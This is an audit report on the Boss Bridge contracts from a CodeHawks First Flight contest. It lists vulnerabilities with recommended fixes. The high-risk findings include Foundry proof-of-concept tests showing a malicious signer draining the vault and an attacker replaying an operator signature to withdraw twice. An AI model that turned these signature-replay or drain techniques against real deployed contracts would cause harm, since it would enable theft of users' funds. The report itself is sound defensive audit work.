# First Flight #4: Boss Bridge - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Malicious signer can drain all the funds from the vault by signing the withdrawal message hash for self.](#H-01)
    - ### [H-02. A withdrawal request if signed by more than 1 signer will allow one to withdraw more than 1 times for a single time deposited token.](#H-02)
    - ### [H-03. The signature can be reused again and again to withdraw as much as possible tokens and potentially drain all the funds from Vault.](#H-03)
- ## Medium Risk Findings
    - ### [M-01. Insufficient token balance on L2, will not mint tokens on that layer.](#M-01)
- ## Low Risk Findings
    - ### [L-01. `TokenFactory::deployToken` can replace the address corresponding to a already created token symbol](#L-01)
    - ### [L-02. Missing event emission in `L1BossBridge::sendToL1` and `L1BossBridge::setSigner`](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #4

### Dates: Nov 9th, 2023 - Nov 15th, 2023

[See more contest details here](https://www.codehawks.com/contests/clomptuvr0001ie09bzfp4nqw)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 3
   - Medium: 1
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. Malicious signer can drain all the funds from the vault by signing the withdrawal message hash for self.            



## Summary
A malicious signer can potentially withdraw all the funds to themselves as they have full control over the funds transfer and can drain all the funds from the vault. The bridge is meant to allow the user to deposit and withdraw their bridged funds, but it can misused by the signer to drain all the funds, as instead of calling transfer for the user, they can call it for themselves with the full amount inside the vault.

## Vulnerability Details
- There is no mechanism inside ```L1BossBridge``` contract to track the withdrawal request being signed by signer actually exists or not due to which a malicious signer can sign for any withdrawal request that can be on their address and 
can potentially drain all the funds by signing the withdrawal message hash for themselves and drain all the funds from the Vault by calling ```L1BossBridge::withdrawTokensToL1``` with their own signature containing the withdrawal request to send funds to their own address.
- Also, a malicious signer can call ```L1BossBridge::depositTokensToL2``` and after successful withdrawal on L2, the signer can then withdraw the token that was deposited on L1 by approving the withdrawal request for themselves.

## Impact
High. A malicious signer can drain all funds.

## Tools Used
Manual Review, Foundry Test

## PoC
Paste the below test in ```test/L1TokenBridge.t.sol``` and run the test: ```forge test --mt test_MaliciousSignerCanDrainAllFunds```
```cpp
function test_MaliciousSignerCanDrainAllFunds() public {
    uint256 depositAmount = 10e18;

    vm.startPrank(user);

    token.approve(address(tokenBridge), depositAmount);
    tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

    vm.stopPrank();

    uint256 vaultMaxBalance = token.balanceOf(address(vault));
    bytes memory maliciousWithdrawalMessage = _getTokenWithdrawalMessage(operator.addr, vaultMaxBalance);
    uint256 maliciousOperatorInitBalance = token.balanceOf(operator.addr);

    (uint8 v, bytes32 r, bytes32 s) = _signMessage(maliciousWithdrawalMessage, operator.key);

    tokenBridge.withdrawTokensToL1(operator.addr, vaultMaxBalance, v, r, s);

    uint256 maliciousOperatorFinalBalance = token.balanceOf(operator.addr);

    assert(vaultMaxBalance != 0);
    assertEq(maliciousOperatorFinalBalance, maliciousOperatorInitBalance + vaultMaxBalance);
}
```

## Recommendations
When deposit is made on a layer 1 to bridge tokens to layer 2 or vice-versa, then a off-chain event is triggered, so consider adding a nonce with that event which will uniquely identify that particular bridge request and store that withdrawal request corresponding to the nonce, which will make sure that a txn being signed by a signer actually exists.
So, when the off-chain mechanism picks up the event mints the corresponding tokens on L2, along with that the particular withdrawal request should be stored on-chain.
## <a id='H-02'></a>H-02. A withdrawal request if signed by more than 1 signer will allow one to withdraw more than 1 times for a single time deposited token.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L91

## Summary
If more than one signers signs for the same withdrawal request, then it will allow one to withdraw more than 1 time, as there is no track of withdrawal being made for deposited amount on the other chain.

## Vulnerability Details
When a user calls ```L1BossBridge::depositTokensToL2``` then tokens are minted on L2, which are then signed by the Signer to approve the withdrawal. But if more than 1 signer signs for the same withdrawal request, the withdrawal can be done more than one time. There is no track for a particular bridge request whether that was fulfilled or not, so if a withdrawal request was signed by 2 signers, it will allow one to withdraw two times even for a single deposit.

## Impact
Medium. If more than one signer signs on the same withdrawal request, it will allow the depositor to withdraw funds that many times.

## Tools Used
Manual Review

## Recommendations
To use a unique identifier like a counter which will generate for every deposit made and also it will be included in the event and the messageHash (the hash that is signed by the signer). So, that it can be tracked on the basis of that counter variable that whether funds were withdrawn or not for a txn, and even if two signers signs for the same txn it will revert for the other signature as the withdrawal was already made.
## <a id='H-03'></a>H-03. The signature can be reused again and again to withdraw as much as possible tokens and potentially drain all the funds from Vault.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L91

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L112

## Summary
- The ```L1BossBridge::sendToL1``` can be called with the same signatures again and again until all funds are drained from the Vault. As there is no updation on-chain when one withdraws the amount using the signature and it is not tracked whether the signature being used was used earlier or not, as a result of which it can be used multiple times.
- Also the parameters in the signature are not sufficient to track whether the signature being used is fresh or already used. 

## Vulnerability Details
When one deposits token on L2 to bridge them on L1, the bridge operator approves it by signing a withdrawal message but the usage of signature is not tracked, thus it can be used multiple times to withdraw the tokens on L1 again and again, and potentially drain all the funds via the ```L1BossBridge::sendToL1``` function.

## PoC

### Actors:
- **Attacker**: One who deposits token on L2 to bridge on L1 and use the same signature to withdraw multiple times and drain all the funds.
- **User**: One who deposits on L1 and wants to bridge on L2.
- **Protocol**: The L1BossBridge which handles all the token deposits and withdrawal.
- **Vault**: The vault used to hold the deposited funds.

```cpp
function test_SignatureCanBeReusedAndAllFundsCanBeWithdrawn() public {
    uint256 depositAmount = 10e18;          // user deposits 10 tokens. This amount gets transferred to L1 vault
    address attacker = makeAddr("attacker");  // address of attacker
    uint256 attackerDepositedAmountOnL2 = 5e18;  // let attacker deposited 5 tokens on L2 for bridging on L1
    uint256 attackerWithdrawalAmount = attackerDepositedAmountOnL2;

    vm.startPrank(user);

    // the user deposits token on L1 to get them on L2
    token.approve(address(tokenBridge), depositAmount);
    tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

    vm.stopPrank();

    assertEq(token.balanceOf(address(vault)), depositAmount);

    uint256 attackerInitBalance = token.balanceOf(attacker);

    // Assuming that attacker deposited token amount equivalent to 'attackerDepositedAmountOnL2' on L2 
    // And wants to withdraw on L1
    // Bridge operator signs the required message to perform txn to withdraw
    bytes memory tokenWithdrawalMessage = _getTokenWithdrawalMessage(attacker, attackerWithdrawalAmount);
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(tokenWithdrawalMessage, operator.key);

    vm.startPrank(attacker);

    // Attacker withdraws using the signature of operator who approved for withdrawal
    tokenBridge.withdrawTokensToL1(attacker, attackerWithdrawalAmount, v, r, s);

    // attacker again reuses the same signature to withdraw
    tokenBridge.withdrawTokensToL1(attacker, attackerWithdrawalAmount, v, r, s);

    vm.stopPrank();

    uint256 attackerFinalBalance = token.balanceOf(attacker);

    // attacker was able to withdraw more amount by re-using the same signature
    assertEq(attackerFinalBalance, attackerInitBalance + (attackerWithdrawalAmount * 2));
    assertEq(token.balanceOf(address(vault)), 0);
}
```

## Impact
High. All funds can be drained out of the Vault by re-using the same signature.

## Likelihood
High. One is only required to call the ```L1BossBridge::withdrawTokensToL1``` to re-use the same signatures again and again, and potentially withdraw all the funds.

## Tools Used
Manual Review, Foundry Test

## Recommendations
Use a nonce in the withdrawal message which is signed by the bridge operator.
This way each signature can be uniquely identified and can be tracked via ```mapping(uint256 nonce => bool) isUsed```
```diff
diff --git a/src/L1BossBridge.sol b/src/L1BossBridge.sol
index 3925b86..04f0204 100644
--- a/src/L1BossBridge.sol
+++ b/src/L1BossBridge.sol
@@ -32,10 +32,12 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
     IERC20 public immutable token;
     L1Vault public immutable vault;
     mapping(address account => bool isSigner) public signers;
+    mapping(uint256 nonce => bool) public isSignatureUsed;
 
     error L1BossBridge__DepositLimitReached();
     error L1BossBridge__Unauthorized();
     error L1BossBridge__CallFailed();
+    error L1BossBridge__SignatureAlreadyUsed();
 
     event Deposit(address from, address to, uint256 amount);
 
@@ -88,7 +90,7 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
      * @param r The r value of the signature
      * @param s The s value of the signature
      */
-    function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
+    function withdrawTokensToL1(address to, uint256 amount, uint256 nonce, uint8 v, bytes32 r, bytes32 s) external {
         sendToL1(
             v,
             r,
@@ -96,6 +98,7 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
             abi.encode(
                 address(token),
                 0, // value
+                nonce,
                 abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
             )
         );
@@ -116,7 +119,13 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
             revert L1BossBridge__Unauthorized();
         }
 
-        (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));
+        (address target, uint256 value, uint256 nonce, bytes memory data) = abi.decode(message, (address, uint256, uint256, bytes));
+
+        if (isSignatureUsed[nonce]) {
+            revert L1BossBridge__SignatureAlreadyUsed();
+        }
+
+        isSignatureUsed[nonce] = true;
 
         (bool success,) = target.call{ value: value }(data);
         if (!success) {
```
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Insufficient token balance on L2, will not mint tokens on that layer.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L70

## Summary
Insufficient token balance on L2 will lead to no token minting on L2 for the corresponding bridge request on L1 even though the ```L1BossBridge::L1BossBridge``` txn was successful.

## Vulnerability Details
When a user bridges token by ```L1BossBridge::L1BossBridge```, an event is triggered which off-chain mechanism picks up, and mints the corresponding tokens on L2 but if in case the balance is less than the deposited amount, so there will be no minting of tokens on L2 as a result of which the request will be bounced and user will receive no funds.

## Impact
User can't withdraw the bridged tokens on the other layer.

## Tools Used
Manual Review

## Recommendations
To only allow user to deposit if there are sufficient funds.

# Low Risk Findings

## <a id='L-01'></a>L-01. `TokenFactory::deployToken` can replace the address corresponding to a already created token symbol            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/TokenFactory.sol#L23

## Summary
If the owner creates a new token with the same symbol as previously created token then it will replace the existing token address in the mapping ```s_tokenToAddress```. 

## Vulnerability Details
The function ```TokenFactory::deployToken``` don't check if there is an already deployed token contract corresponding to symbol, which will thus lead to replacing the address of the contract if the function is called again with the same symbol.

## Impact
Owner can mistakenly pass the pre-existin token contract's symbol which will replace the address. 

## Tools Used
Manual Review

## Recommendations
- To have a check in the ```TokenFactory::deployToken``` function to revert if the address corresponding to a symbol is not ```address(0)``` then it should revert.
- Also if the protocol wants to change the contract corresponding to a symbol, then a new function ```modifyToken``` can be implemented which will deploy a new token contract and change the address to the address of newly deployed token contract.
## <a id='L-02'></a>L-02. Missing event emission in `L1BossBridge::sendToL1` and `L1BossBridge::setSigner`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L112

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L57

## Summary
Missing event emission in functions of L1BossBridge - ```sendToL1``` and ```setSigner```

## Vulnerability Details
There is no event emitted when change is made on-chain, which will keep off-chain state unmodified.

## Impact
Off-chain data is not tracked properly.

## Tools Used
Manual Review

## Recommendations
To emit the events in both functions discussed above.


